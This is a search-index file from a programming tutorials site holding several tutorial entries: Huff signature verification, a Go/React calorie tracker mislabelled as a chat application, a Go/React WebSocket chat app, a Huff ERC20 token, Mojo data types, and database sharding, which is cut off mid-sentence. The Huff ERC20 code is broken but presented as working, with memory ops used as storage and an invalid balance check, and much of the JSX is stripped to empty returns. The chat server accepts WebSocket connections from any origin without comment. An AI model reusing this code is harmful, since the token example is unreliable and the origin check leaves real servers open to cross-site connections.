size equals 97 (0x61 in hex). extractParamsAndStore jumpi: Jumps to the extractParamsAndStore label if the size is correct. oog jump: Jumps to the oog label if the size is incorrect, causing the transaction to run out of gas. Extracting Parameters linkNext, we extract the message hash and the signature components (v, r, s) from the calldata and store them in memory.\nextractParamsAndStore: /// Store the message hash 0x00 calldataload 0x00 mstore /// Store 'v' 0x60 calldataload 0x3f mstore /// Store 'r' 0x20 calldataload 0x40 mstore /// Store 's' 0x40 calldataload 0x60 mstore calldataload: Loads data from calldata at specified offset. mstore: Stores data in memory at specified offset. Preparing for ecrecover linkWe prepare the stack with parameters for the ecrecover static call.\n0x20 0x00 0x80 0x00 chainid gas staticcall validate jumpi oog jump staticcall: Performs a static call to the ecrecover precompiled contract. validate jumpi: Jumps to the validate label if the call is successful. oog jump: Jumps to the oog label if the call fails. Validating the Signer linkWe verify if the extracted signer’s address matches the transaction sender’s address.\nvalidate: 0x00 mload // [rcvd_address] dup1 // [rcvd_address, rcvd_address] caller // [msg.sender, rcvd_address] eq valid jumpi // [msg.sender == rcvd_address?] oog jump // if not equal, jump to out-of-gas block mload: Loads the signer’s address from memory. caller: Gets the address of the transaction sender. eq: Checks if the two addresses are equal. valid jumpi: Jumps to the valid label if they are equal. oog jump: Jumps to the oog label if they are not equal. Returning True linkIf the signature is valid, we return true.\nvalid: chainid 0x00 mstore 0x20 0x00 return chainid: Gets the chain ID (used here to represent true). mstore: Stores the result in memory. return: Returns the result. Out-of-Gas linkIf any check fails, we run out of gas.\noog: 0x01 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff mstore Attempts to store a massive value into memory, causing the transaction to run out of gas. Conclusion linkThis optimized Huff contract verifies if a message was signed by the sender of the transaction. By carefully structuring the calldata and using efficient opcodes, we ensure that the contract performs its task effectively. If any part of the validation fails, the contract will cause the transaction to run out of gas.\n"
            }
        );
    index.add(
            {
                id:  76 ,
                href: "\/tutorials\/docs\/full-stack-projects\/full-stack-projects\/calorie_tracker_using_go_react\/",
                title: "Creating a Simple Chat Application using Go and React",
                description: "How to install and use libraries",
                content: "Sure! Let’s break down the provided Go code into a structured explanation for the backend of our calorie tracker application.\nBackend: Go with Gin and MongoDB linkWe’ll use the Go programming language with the Gin framework for our backend. MongoDB will serve as our database to store calorie entries.\nStep 1: Models linkThe models package defines the structure of our calorie entry data.\npackage models import ( \"go.mongodb.org/mongo-driver/bson/primitive\" ) // Entry represents a calorie entry in the database type Entry struct { ID primitive.ObjectID `bson:\"id\"` Dish *string `json:\"dish\"` Fat *float64 `json:\"fat\"` Ingredients *string `json:\"ingredients\"` Calories *string `json:\"calories\"` } This structure includes:\nID: A unique identifier for the entry, generated by MongoDB. Dish: The name of the dish. Fat: The fat content of the dish. Ingredients: The ingredients of the dish. Calories: The calorie count of the dish. Step 2: Database Connection linkThe routes package handles the database connection.\npackage routes import ( \"context\" \"fmt\" \"log\" \"time\" \"go.mongodb.org/mongo-driver/mongo\" \"go.mongodb.org/mongo-driver/mongo/options\" ) func DBinstance() *mongo.Client { MongoDb := \"mongodb://localhost:27017/caloriesdb\" client, err := mongo.NewClient(options.Client().ApplyURI(MongoDb)) if err != nil { log.Fatal(err) } ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second) defer cancel() err = client.Connect(ctx) if err != nil { log.Fatal(err) } fmt.Println(\"Connected to MongoDB\") return client } var Client *mongo.Client = DBinstance() func OpenCollection(client *mongo.Client, collectionName string) *mongo.Collection { var collection *mongo.Collection = client.Database(\"caloriesdb\").Collection(collectionName) return collection } This code sets up the connection to a MongoDB database running locally on mongodb://localhost:27017. The database is named caloriesdb and contains a collection named calories.\nStep 3: CRUD Operations linkThe routes package also defines the CRUD operations for our calorie entries.\npackage routes import ( \"context\" \"fmt\" \"net/http\" \"time\" \"github.com/gin-gonic/gin\" \"github.com/go-playground/validator/v10\" \"github.com/your_username/your_project_name/models\" \"go.mongodb.org/mongo-driver/bson\" \"go.mongodb.org/mongo-driver/bson/primitive\" \"go.mongodb.org/mongo-driver/mongo\" ) var validate = validator.New() var entryCollection *mongo.Collection = OpenCollection(Client, \"calories\") func AddEntry(c *gin.Context) { var ctx, cancel = context.WithTimeout(context.Background(), 100*time.Second) var entry models.Entry if err := c.BindJSON(\u0026entry); err != nil { c.JSON(http.StatusInternalServerError, gin.H{\"error\": err.Error()}) fmt.Println(err) return } validationErr := validate.Struct(entry) if validationErr != nil { c.JSON(http.StatusInternalServerError, gin.H{\"error\": validationErr.Error()}) fmt.Println(validationErr) return } entry.ID = primitive.NewObjectID() result, insertErr := entryCollection.InsertOne(ctx, entry) if insertErr != nil { msg := fmt.Sprintf(\"Entry was not created\") c.JSON(http.StatusInternalServerError, gin.H{\"error\": msg}) fmt.Println(insertErr) return } defer cancel() c.JSON(http.StatusOK, result) } func GetEntries(c *gin.Context) { var ctx, cancel = context.WithTimeout(context.Background(), 100*time.Second) var entries []bson.M cursor, err := entryCollection.Find(ctx, bson.M{}) if err != nil { c.JSON(http.StatusInternalServerError, gin.H{\"error\": err.Error()}) fmt.Println(err) return } if err = cursor.All(ctx, \u0026entries); err != nil { c.JSON(http.StatusInternalServerError, gin.H{\"error\": err.Error()}) fmt.Println(err) return } defer cancel() fmt.Println(entries) c.JSON(http.StatusOK, entries) } func GetEntriesByIngredient(c *gin.Context) { ingredient := c.Params.ByName(\"ingredient\") var ctx, cancel = context.WithTimeout(context.Background(), 100*time.Second) var entries []bson.M cursor, err := entryCollection.Find(ctx, bson.M{\"ingredients\": ingredient}) if err != nil { c.JSON(http.StatusInternalServerError, gin.H{\"error\": err.Error()}) fmt.Println(err) return } if err = cursor.All(ctx, \u0026entries); err != nil { c.JSON(http.StatusInternalServerError, gin.H{\"error\": err.Error()}) fmt.Println(err) return } defer cancel() fmt.Println(entries) c.JSON(http.StatusOK, entries) } func GetEntryById(c *gin.Context) { EntryID := c.Params.ByName(\"id\") docID, _ := primitive.ObjectIDFromHex(EntryID) var ctx, cancel = context.WithTimeout(context.Background(), 100*time.Second) var entry bson.M if err := entryCollection.FindOne(ctx, bson.M{\"_id\": docID}).Decode(\u0026entry); err != nil { c.JSON(http.StatusInternalServerError, gin.H{\"error\": err.Error()}) fmt.Println(err) return } defer cancel() fmt.Println(entry) c.JSON(http.StatusOK, entry) } func UpdateIngredient(c *gin.Context) { entryID := c.Params.ByName(\"id\") docID, _ := primitive.ObjectIDFromHex(entryID) var ctx, cancel = context.WithTimeout(context.Background(), 100*time.Second) type Ingredient struct { Ingredients *string `json:\"ingredients\"` } var ingredient Ingredient if err := c.BindJSON(\u0026ingredient); err != nil { c.JSON(http.StatusInternalServerError, gin.H{\"error\": err.Error()}) fmt.Println(err) return } result, err := entryCollection.UpdateOne(ctx, bson.M{\"_id\": docID}, bson.D{{\"$set\", bson.D{{\"ingredients\", ingredient.Ingredients}}}}, ) if err != nil { c.JSON(http.StatusInternalServerError, gin.H{\"error\": err.Error()}) fmt.Println(err) return } defer cancel() c.JSON(http.StatusOK, result.ModifiedCount) } func UpdateEntry(c *gin.Context) { entryID := c.Params.ByName(\"id\") docID, _ := primitive.ObjectIDFromHex(entryID) var ctx, cancel = context.WithTimeout(context.Background(), 100*time.Second) var entry models.Entry if err := c.BindJSON(\u0026entry); err != nil { c.JSON(http.StatusInternalServerError, gin.H{\"error\": err.Error()}) fmt.Println(err) return } validationErr := validate.Struct(entry) if validationErr != nil { c.JSON(http.StatusInternalServerError, gin.H{\"error\": validationErr.Error()}) fmt.Println(validationErr) return } result, err := entryCollection.ReplaceOne( ctx, bson.M{\"_id\": docID}, bson.M{ \"dish\": entry.Dish, \"fat\": entry.Fat, \"ingredients\": entry.Ingredients, \"calories\": entry.Calories, }, ) if err != nil { c.JSON(http.StatusInternalServerError, gin.H{\"error\": err.Error()}) fmt.Println(err) return } defer cancel() c.JSON(http.StatusOK, result.ModifiedCount) } func DeleteEntry(c *gin.Context) { entryID := c.Params.ByName(\"id\") docID, _ := primitive.ObjectIDFromHex(entryID) var ctx, cancel = context.WithTimeout(context.Background(), 100*time.Second) result, err := entryCollection.DeleteOne(ctx, bson.M{\"_id\": docID}) if err != nil { c.JSON(http.StatusInternalServerError, gin.H{\"error\": err.Error()}) fmt.Println(err) return } defer cancel() c.JSON(http.StatusOK, result.DeletedCount) } These functions handle the creation, retrieval, updating, and deletion of entries in the MongoDB collection.\nStep 4: Main Application linkThe main function sets up the routes and starts the server.\npackage main import ( \"os\" \"github.com/gin-contrib/cors\" \"github.com/gin-gonic/gin\" \"github.com/your_username/your_project_name/routes\" ) func main() { port := os.Getenv(\"PORT\") if port == \"\" { port = \"8000\" } router := gin.New() router.Use(gin.Logger()) router.Use(cors.Default()) router.POST(\"/entry/create\", routes.AddEntry) router.GET(\"/entries\", routes.GetEntries) router.GET(\"/entry/:id/\", routes.GetEntryById) router.GET(\"/ingredient/:ingredient\", routes.GetEntriesByIngredient) router.PUT(\"/entry/update/:id\", routes.UpdateEntry) router.PUT(\"/ingredient/update/:id\", routes.UpdateIngredient) router.DELETE(\"/entry/delete/:id\", routes.DeleteEntry) router.Run(\":\" + port) } This sets up the endpoints:\nPOST /entry/create to add a new entry. GET /entries to get all entries. GET /entry/:id to get a single entry by ID.\nGET /ingredient/:ingredient to get entries by ingredient. PUT /entry/update/:id to update an entry. PUT /ingredient/update/:id to update the ingredients of an entry. DELETE /entry/delete/:id to delete an entry. With the backend set up, you can now start the server by running:\ngo run main.go Your backend should now be running on http://localhost:8000.\nNext, let’s set up the React frontend.\nFrontend: React with Axios and Bootstrap linkStep 1: Set Up the Project linkFirst, ensure you have Node.js and Create React App installed. Then, create a new React project and install the necessary dependencies.\nnpx create-react-app calorie-tracker-frontend cd calorie-tracker-frontend npm install axios bootstrap react-bootstrap Step 2: Create the Components linkWe’ll create three main components: App, Entries, and Entry.\nApp Component\nThis is the root component of the application.\nimport React from 'react'; import 'bootstrap/dist/css/bootstrap.css'; import Entries from './components/entries.components'; function App() { return ( ); } export default App; Entries Component\nThis component manages the list of entries and handles adding, updating, and deleting entries.\nimport React, { useState, useEffect } from 'react'; import axios from \"axios\"; import { Button, Form, Container, Modal } from 'react-bootstrap'; import Entry from './single-entry.component'; const Entries = () =\u003e { const [entries, setEntries] = useState([]); const [refreshData, setRefreshData] = useState(false); const [changeEntry, setChangeEntry] = useState({ \"change\": false, \"id\": 0 }); const [changeIngredient, setChangeIngredient] = useState({ \"change\": false, \"id\": 0 }); const [newIngredientName, setNewIngredientName] = useState(\"\"); const [addNewEntry, setAddNewEntry] = useState(false); const [newEntry, setNewEntry] = useState({ \"dish\": \"\", \"ingredients\": \"\", \"calories\": 0, fat: 0 }); useEffect(() =\u003e { getAllEntries(); }, []); useEffect(() =\u003e { if (refreshData) { setRefreshData(false); getAllEntries(); } }, [refreshData]); return ( "
            }
        );
    index.add(
            {
                id:  77 ,
                href: "\/tutorials\/docs\/full-stack-projects\/full-stack-projects\/chat_application_using_react_and_go\/",
                title: "Creating a Simple Chat Application using Go and React",
                description: "How to install and use libraries",
                content: "Creating a Simple Chat Application with Go (Backend) linkIn this tutorial, we’ll walk through the process of building a simple chat application backend using Go. The backend will leverage WebSockets to allow real-time communication between clients. Here’s a detailed explanation of the provided code, covering the main components and concepts used.\nTable of Contents link WebSocket Client Client Struct Message Struct Read Method WebSocket Pool Pool Struct NewPool Function Start Method WebSocket Upgrade Upgrade Function Main Application serveWS Function setupRoutes Function main Function 1. WebSocket Client linkClient Struct link package websocket import ( \"sync\" \"github.com/gorilla/websocket\" ) type Client struct { ID string Conn *websocket.Conn Pool *Pool mu sync.Mutex } The Client struct represents a connected WebSocket client. It includes:\nID: A unique identifier for the client. Conn: The WebSocket connection. Pool: A reference to the pool that manages this client. mu: A mutex for handling concurrent access. Message Struct link type Message struct { Type int `json:\"type\"` Body string `json:\"body\"` } The Message struct represents a message exchanged between clients. It includes:\nType: The type of message (text, binary, etc.). Body: The message content. Read Method link func (c *Client) Read() { defer func() { c.Pool.Unregister \u003c- c c.Conn.Close() }() for { messageType, p, err := c.Conn.ReadMessage() if err != nil { log.Println(err) return } message := Message{Type: messageType, Body: string(p)} c.Pool.Broadcast \u003c- message fmt.Printf(\"Message Received: %+v\\n\", message) } } The Read method continuously listens for incoming messages from the client’s WebSocket connection. When a message is received, it is broadcast to all other clients via the pool.\ndefer: Ensures that the client is unregistered and the connection is closed when the method exits. Conn.ReadMessage(): Reads a message from the WebSocket connection. c.Pool.Broadcast: Sends the message to all connected clients. 2. WebSocket Pool linkPool Struct link package websocket type Pool struct { Register chan *Client Unregister chan *Client Clients map[*Client]bool Broadcast chan Message } The Pool struct manages all active WebSocket clients. It includes:\nRegister: A channel for registering new clients. Unregister: A channel for unregistering clients. Clients: A map of active clients. Broadcast: A channel for broadcasting messages to all clients. NewPool Function link func NewPool() *Pool { return \u0026Pool{ Register: make(chan *Client), Unregister: make(chan *Client), Clients: make(map[*Client]bool), Broadcast: make(chan Message), } } The NewPool function creates and returns a new instance of Pool.\nStart Method link func (pool *Pool) Start() { for { select { case client := \u003c-pool.Register: pool.Clients[client] = true fmt.Println(\"Size of Connection Pool: \", len(pool.Clients)) for client := range pool.Clients { client.Conn.WriteJSON(Message{Type: 1, Body: \"New User Joined...\"}) } case client := \u003c-pool.Unregister: delete(pool.Clients, client) fmt.Println(\"Size of Connection Pool: \", len(pool.Clients)) for client := range pool.Clients { client.Conn.WriteJSON(Message{Type: 1, Body: \"User Disconnected...\"}) } case message := \u003c-pool.Broadcast: fmt.Println(\"Sending message to all clients in Pool\") for client := range pool.Clients { if err := client.Conn.WriteJSON(message); err != nil { fmt.Println(err) return } } } } } The Start method continuously listens for registration, unregistration, and broadcast events.\nRegister: Adds a new client to the pool and notifies all clients. Unregister: Removes a client from the pool and notifies all clients. Broadcast: Sends a message to all clients in the pool. 3. WebSocket Upgrade linkUpgrade Function link package websocket import ( \"log\" \"net/http\" \"github.com/gorilla/websocket\" ) var upgrader = websocket.Upgrader{ ReadBufferSize: 1024, WriteBufferSize: 1024, } func Upgrade(w http.ResponseWriter, r *http.Request) (*websocket.Conn, error) { upgrader.CheckOrigin = func(r *http.Request) bool { return true } conn, err := upgrader.Upgrade(w, r, nil) if err != nil { log.Println(err) return nil, err } return conn, nil } The Upgrade function upgrades an HTTP connection to a WebSocket connection using the Gorilla WebSocket package.\nupgrader: Configures WebSocket connection parameters. Upgrade: Upgrades the HTTP connection and returns the WebSocket connection. 4. Main Application linkserveWS Function link package main import ( \"fmt\" \"net/http\" \"github.com/akhil/golang-chat/pkg/websocket\" ) func serveWS(pool *websocket.Pool, w http.ResponseWriter, r *http.Request) { fmt.Println(\"websocket endpoint reached\") conn, err := websocket.Upgrade(w, r) if err != nil { fmt.Fprintf(w, \"%+v\\n\", err) } client := \u0026websocket.Client{ Conn: conn, Pool: pool, } pool.Register \u003c- client client.Read() } The serveWS function handles WebSocket requests. It upgrades the connection, creates a new client, and starts listening for messages from that client.\nsetupRoutes Function link func setupRoutes() { pool := websocket.NewPool() go pool.Start() http.HandleFunc(\"/ws\", func(w http.ResponseWriter, r *http.Request) { serveWS(pool, w, r) }) } The setupRoutes function sets up the HTTP routes for the application. It creates a new pool, starts it, and defines the WebSocket endpoint.\nmain Function link func main() { fmt.Println(\"Akhil's full stack chat project\") setupRoutes() http.ListenAndServe(\":9000\", nil) } The main function starts the HTTP server on port 9000 and sets up the routes.\nBuilding a Simple Chat Application with Go and React (Frontend) linkContinuing from where we left off with the backend setup using Go, we now focus on creating the frontend using React. This frontend will communicate with our Go WebSocket server to send and receive messages in real-time.\nTable of Contents link Setting Up WebSocket Connection src/api/index.js Chat History Component src/components/ChatHistory.jsx Chat Input Component src/components/ChatInput.jsx Header Component src/components/Header.jsx Message Component src/components/Message.jsx Main Application Component src/App.jsx 1. Setting Up WebSocket Connection linksrc/api/index.js link // api/index.js var socket = new WebSocket('ws://localhost:9000/ws'); let connect = (cb) =\u003e { console.log(\"connecting\") socket.onopen = () =\u003e { console.log(\"Successfully Connected\"); } socket.onmessage = (msg) =\u003e { console.log(\"Message from WebSocket: \", msg); cb(msg); } socket.onclose = (event) =\u003e { console.log(\"Socket Closed Connection: \", event) } socket.onerror = (error) =\u003e { console.log(\"Socket Error: \", error) } }; let sendMsg = (msg) =\u003e { console.log(\"sending msg: \", msg); socket.send(msg); }; export { connect, sendMsg }; This module sets up a WebSocket connection to the backend server and provides functions to connect and send messages.\nconnect(cb): Establishes the connection and sets up event listeners for WebSocket events (onopen, onmessage, onclose, onerror). The callback cb is called whenever a message is received. sendMsg(msg): Sends a message to the WebSocket server. 2. Chat History Component linksrc/components/ChatHistory.jsx link import React, { Component } from 'react'; import './ChatHistory.scss'; import Message from '../Message/Message'; class ChatHistory extends Component { render() { console.log(this.props.chatHistory); const messages = this.props.chatHistory.map(msg =\u003e ); return ( Chat History {messages} ); }; } export default ChatHistory; The ChatHistory component displays the chat history. It maps through the chatHistory prop and renders a Message component for each message.\nthis.props.chatHistory: An array of messages passed down from the parent component. messages: An array of Message components created from chatHistory. 3. Chat Input Component linksrc/components/ChatInput.jsx link import React, { Component } from 'react'; import './ChatInput.scss'; class ChatInput extends Component { render() { return ( ); }; } export default ChatInput; The ChatInput component renders an input field where users can type their messages. When the user presses the “Enter” key, the send function from the parent component is called.\nthis.props.send: A function passed down from the parent component to handle sending messages. 4. Header Component linksrc/components/Header.jsx link import React from 'react'; import './Header.scss'; const Header = () =\u003e ( Go + React Socket Chat ); export default Header; The Header component displays a static header for the chat application.\n5. Message Component linksrc/components/Message.jsx link import React, { Component } from 'react'; import './Message.scss'; class Message extends Component { constructor(props) { super(props); let temp = JSON.parse(this.props.message); this.state = { message: temp } } render() { return ( {this.state.message.body} ); }; } export default Message; The Message component renders a single chat message. It parses the message prop (assumed to be JSON) and displays its body field.\nconstructor(props): Parses the message prop and sets the initial state. this.state.message.body: The body of the message to be displayed. 6. Main Application Component linkFinally, you need a main component to bring everything together. Create src/App.jsx:\nimport React, { Component } from 'react'; import { connect, sendMsg } from './api'; import Header from './components/Header'; import ChatHistory from './components/ChatHistory'; import ChatInput from './components/ChatInput'; import './App.scss'; class App extends Component { constructor(props) { super(props); this.state = { chatHistory: [] }; } componentDidMount() { connect((msg) =\u003e { console.log(\"New Message\"); this.setState(prevState =\u003e ({ chatHistory: [...prevState.chatHistory, msg] })); console.log(this.state); }); } send(event) { if (event.keyCode === 13) { sendMsg(event.target.value); event.target.value = ''; } } render() { return ( "
            }
        );
    index.add(
            {
                id:  78 ,
                href: "\/tutorials\/docs\/huff\/huff\/creating_a_token_in_huff\/",
                title: "Creating a Token With Huff",
                description: "Huff is a domain-specific, low-level programming language designed explicitly for writing smart contracts on the Ethereum blockchain.",
                content: "Creating a Token in Huff linkCreating a token on the Ethereum network, especially adhering to popular standards like ERC20, is a common task in smart contract development. In this section, we’ll develop a basic ERC20 token using Huff. This example will demonstrate fundamental token functionalities such as transferring tokens and keeping track of balances.\nOverview of ERC20 Token Standard linkThe ERC20 standard defines a set of rules that an Ethereum token contract must follow. It includes methods for transferring tokens, fetching balances, and obtaining the total supply of tokens. Implementing these functionalities in Huff will provide a deeper understanding of the ERC20 standard and Huff’s capabilities.\nStep-by-Step Guide to Creating an ERC20 Token in Huff link Token Initialization: Set up the total supply and allocate it to the contract creator. Transfer Functionality: Implement a function to transfer tokens from one account to another. Balance Tracking: Maintain a mapping of account balances. Code Example: ERC20 Token Contract in Huff link // Define storage slots #define constant TOTAL_SUPPLY_SLOT = 0x0 #define constant BALANCES_SLOT = 0x1 // Macros for common operations #define macro MSTORE_BALANCE() = takes (2) returns (0) { // Store balance at the specified address dup2 0x1 add mstore } #define macro MLOAD_BALANCE() = takes (1) returns (1) { // Load balance for the specified address 0x1 add mload } // Initialize the contract with total supply #define macro INITIALIZE() = takes (0) returns (0) { // Set total supply 1000000 TOTAL_SUPPLY_SLOT sstore // Allocate total supply to contract creator caller BALANCES_SLOT sstore } // Transfer tokens #define macro TRANSFER() = takes (2) returns (0) { // Load sender balance caller MLOAD_BALANCE() // Check if sender has enough balance dup3 gt(assert_enough_balance) // Subtract amount from sender balance sub caller MSTORE_BALANCE() // Add amount to recipient balance over MLOAD_BALANCE() add swap MSTORE_BALANCE() } // Define label for assertion failure #define macro assert_enough_balance() = takes (0) returns (0) { // Revert transaction if balance is insufficient // ... } // Main entry point #define macro MAIN() = takes (0) returns (0) { INITIALIZE() // Additional contract logic... } In this Huff contract example, we define macros for initializing the token with a total supply and allocating it to the contract creator. The TRANSFER macro implements the logic for transferring tokens between accounts, checking balances, and updating them accordingly.\nThis document provides a comprehensive introduction to Huff, from setting up the development environment to writing and deploying smart contracts, including advanced features and practical examples like creating an ERC20 token.\n"
            }
        );
    index.add(
            {
                id:  79 ,
                href: "\/tutorials\/docs\/mojo\/mojo\/data_types_variables_operators\/",
                title: "Data Types, Variables, and Operators in Mojo",
                description: "Mojo Lang description",
                content: "Understanding Data in Mojo link Data is essential in any programming language, including Mojo. It can be anything from numbers and text to complex types like images and audio files. These data are stored in variables, data structures, or files for computation and generating outputs. Examples of Data Declaration in Mojo: link name = \"Vibs\" (Using an emoji as a variable) x = 1 movie = \"Hackerman.mp4\" addresses = [\"Malibu\", \"Brooklyn\"] zipcode = (\"90265\", \"11203\") print(x) Variables and Data Structures: link a = 1 print(\"type of var a:\", type(a)) b = 1.0 print(\"type of var b:\", type(b)) c = \"Hello World\" print(\"type of var c:\", type(c)) d = (1, 2) print(\"type of var d:\", type(d)) e = [\"CA\", \"OR\"] print(\"type of var e:\", type(e)) f = {\"a\": 1, \"b\": 2} print(\"type of var f:\", type(f)) Value Semantics in Mojo link Mojo supports value semantics, which focuses on the value of an object rather than its identity. This means you can pass data structures as logical copies, not references. Data Types in Mojo link Data types in Mojo are classifications that tell the compiler how to process and use the data. Understanding them is crucial for efficient and correct operations. Examples: link let x: Int = 4 print(x) let y: Int = 6 print(y) Computer Memory and Its Impact link Understanding computer memory structure, such as CPU cache levels and the distinction between the stack and the heap, is beneficial for AI Engineers, especially for optimizing code performance. Variables and Constants link In Mojo, variables can be declared as mutable using var or immutable using let. Mutable vs Immutable Variables: link var x = 1 x = 2 // Works fine let y = 1 // y = 2 // This would cause an error Standard Data Types in Mojo link Mojo has a range of built-in data types available through modules, such as Int, Bool, String, and Tuple. These types are implemented using structs in Mojo. Advanced Data Types and Structures link StringLiteral vs String: StringLiteral is constant and loaded into read-only memory. String is a heap-allocated type for larger data storage. Dynamic Vectors: Similar to lists in Python, used for storing multiple values. Tuple: A collection of different data types, accessed by their index. Example of Tuple: link let tup = (1, \"Mojo\", 3) print(tup.get0, Int) // Prints: 1 SIMD (Single Instruction, Multiple Data) link SIMD in Mojo allows performing the same operation across a vector in a single instruction, which enhances performance. Example of SIMD: link from DType import DType y = SIMD[DType.uint8, 4](1, 2, 3, 4) y *= 10 print(y) Structs vs Classes in Mojo link Structs in Mojo are similar to classes in Python in terms of supporting methods, fields, and operator overloading. However, Mojo structs are static and compile-time bound, unlike Python classes. Example of a Struct in Mojo: link struct MyPair: var first: Int var second: Int fn __init__(inout self, first: Int, second: Int): self.first = first self.second = second fn dump(self): print(self.first, self.second) let mine = MyPair(2, 4) mine.dump() // Prints values of the pair "
            }
        );
    index.add(
            {
                id:  80 ,
                href: "\/tutorials\/docs\/system-design\/system-design\/database_sharding\/",
                title: "Database Sharding: Concepts and Examples",
                description: "If you are looking to grow in you tech career and understand system design indepth, this guide is for you.",
                content: "Your application is growing. It has more active users, more features, and generates more data every day. Your database is now becoming a bottleneck for the rest of your application. Database sharding could be the solution to your problems, but many do not have a clear understanding of what it is and, especially, when to use it. In this article, we’ll cover the basics of database sharding, its best use cases, and the different ways you can implement it.\nWhat is database sharding? linkSharding is a method for distributing a single dataset across multiple databases, which can then be stored on multiple machines. This allows for larger datasets to be split into smaller chunks and stored in multiple data nodes, increasing the total storage capacity of the system.\nSimilarly, by distributing the data across multiple machines, a sharded database can handle more requests than a single machine can.\nSharding is a form of scaling known as horizontal scaling or scale-out, as additional nodes are brought on to share the load. Horizontal scaling allows for near-limitless scalability to handle big data and intense workloads. In contrast, vertical scaling refers to increasing the power of a single machine or single server through a more powerful CPU, increased RAM, or increased storage capacity.\nDo you need database sharding? linkDatabase sharding, as with any distributed architecture, does not come for free. There is overhead and complexity in setting up shards, maintaining the data on each shard, and properly routing requests across those shards. Before you begin sharding, consider if one of the following alternative solutions will work for you.\nVertical scaling linkBy simply upgrading your machine, you can scale vertically without the complexity of sharding. Adding RAM, upgrading your computer (CPU), or increasing the storage available to your database are simple solutions that do not require you to change the design of either your database architecture or your application. visualization of vertical scaling in sharding\nSpecialized services or databases linkDepending on your use case, it may make more sense to simply shift a subset of the burden onto other providers or even a separate database. For example, blob or file storage can be moved directly to a cloud provider such as Amazon S3. Analytics or full-text search can be handled by specialized services or a data warehouse. Offloading this particular functionality can make more sense than trying to shard your entire database.\nReplication linkIf your data workload is primarily read-focused, replication increases availability and read performance while avoiding some of the complexity of database sharding. By simply spinning up additional copies of the database, read performance can be increased either through load balancing or through geo-located query routing. However, replication introduces complexity on write-focused workloads, as each write must be copied to every replicated node. visualization of replication in sharding\nOn the other hand, if your core application database contains large amounts of data, requires high read and high write volume, and/or you have specific availability requirements, a sharded database may be the way forward. Let’s look at the advantages and disadvantages of sharding.\nAdvantages of sharding linkSharding allows you to scale your database to handle increased load to a nearly unlimited degree by providing increased read/write throughput, storage capacity, and high availability. Let’s look at each of those in a little more detail.\nIncreased read/write throughput — By distributing the dataset across multiple shards, both read and write operation capacity is increased as long as read and write operations are confined to a single shard. Increased storage capacity — Similarly, by increasing the number of shards, you can also increase overall total storage capacity, allowing near-infinite scalability. High availability — Finally, shards provide high availability in two ways. First, since each shard is a replica set, every piece of data is replicated. Second, even if an entire shard becomes unavailable since the data is distributed, the database as a whole still remains partially functional, with part of the schema on different shards. Disadvantages of sharding linkSharding does come with several drawbacks, namely overhead in query result compilation, complexity of administration, and increased infrastructure costs.\nQuery overhead — Each sharded database must have a separate machine or service which understands how to route a querying operation to the appropriate shard. This introduces additional latency on every operation. Furthermore, if the data required for the query is horizontally partitioned across multiple shards, the router must then query each shard and merge the result together. This can make an otherwise simple operation quite expensive and slow down response times. Complexity of administration - With a single unsharded database, only the database server itself requires upkeep and maintenance. With every sharded database, on top of managing the shards themselves, there are additional service nodes to maintain. Plus, in cases where replication is being used, any data updates must be mirrored across each replicated node. Overall, a sharded database is a more complex system which requires more administration. Increased infrastructure costs — Sharding by its nature requires additional machines and compute power over a single database server. While this allows your database to grow beyond the limits of a single machine, each additional shard comes with higher costs. The cost of a distributed database system, especially if it is missing the proper optimization, can be significant. Having considered the pros and cons, let’s move forward and discuss implementation. How does sharding work? linkIn order to shard a database, we must answer several fundamental questions. The answers will determine your implementation.\nFirst, how will the data be distributed across shards? This is the fundamental question behind any sharded database. The answer to this question will have effects on both performance and maintenance. More detail on this can be found in the “Sharding Architectures and Types” section.\nSecond, what types of queries will be routed across shards? If the workload is primarily read operations, replicating data will be highly effective at increasing performance, and you may not need sharding at all. In contrast, a mixed read-write workload or even a primarily write-based workload will require a different architecture.\nFinally, how will these shards be maintained? Once you have sharded a database, over time, data will need to be redistributed among the various shards, and new shards may need to be created. Depending on the distribution of data, this can be an expensive process and should be considered ahead of time.\nWith these questions in mind, let’s consider some sharding architectures.\nSharding architectures and types linkWhile there are many different sharding methods, we will consider four main kinds: ranged/dynamic sharding, algorithmic/hashed sharding, entity/relationship-based sharding, and geography-based sharding.\nRanged/dynamic sharding Ranged sharding, or dynamic sharding, takes a field on the record as an input and, based on a predefined range, allocates that record to the appropriate shard. Ranged sharding requires there to be a lookup table or service available for all queries or writes. For example, consider a set of data with IDs that range from 0-50. A simple lookup table might look like the following:\nRange Shard ID [0, 20) A [20, 40) B [40, 50] C The field on which the range is based is also known as the shard key. Naturally, the choice of shard key, as well as the ranges, are critical in making range-based sharding effective. A poor choice of shard key will lead to unbalanced shards, which leads to decreased performance. An effective shard key will allow for queries to be targeted to a minimum number of shards. In our example above, if we query for all records with IDs 10-30, then only shards A and B will need to be queried.\nTwo key attributes of an effective shard key are high cardinality and well-distributed frequency. Cardinality refers to the number of possible values of that key. If a shard key only has three possible values, then there can only be a maximum of three shards. Frequency refers to the distribution of the data along the possible values. If 95% of records occur with a single shard key value then, due to this hotspot, 95% of the records will be allocated to a single shard. Consider both of these attributes when selecting a shard key.\nRange-based sharding is an easy-to-understand method of horizontal partitioning, but the effectiveness of it will depend heavily on the availability of a suitable shard key and the selection of appropriate ranges. Additionally, the lookup service can become a bottleneck, although the amount of data is small enough that this typically is not an issue.\nAlgorithmic/hashed sharding Algorithmic sharding or hashed sharding, takes a record as an input and applies a hash function or algorithm to it which generates an output or hash value. This output is then used to allocate each record to the appropriate shard.\nThe function can take any subset of values on the record as inputs. Perhaps the simplest example of a hash function is to use the modulus operator with the number of shards, as follows:\nHash Value=ID % Number of Shards\nThis is similar to range-based sharding — a set of fields determines the allocation of the record to a given shard. Hashing the inputs allows more even distribution across shards even when there is not a suitable shard key, and no lookup table needs to be maintained. However, there are a few drawbacks.\nFirst, query operations for multiple records are more likely to get distributed across multiple shards. Whereas ranged sharding reflects the natural structure of the data across shards, hashed sharding typically disregards the meaning of the data. This is reflected in increased broadcast operation occurrence.\nSecond, resharding can be expensive. Any update to the number of shards likely requires rebalancing all shards to moving around records. It will be difficult to do this while avoiding a system outage.\nEntity-/relationship-based sharding Entity-based sharding keeps related data together on a single physical shard. In a relational database (such as PostgreSQL, MySQL, or SQL Server), related data is often spread across several different tables.\nFor instance, consider the case of a shopping database with users and payment methods. Each user has a set of payment methods that is tied tightly with that user. As such, keeping related data together on the same shard can reduce the need for broadcast operations, increasing performance.\nGeography-based 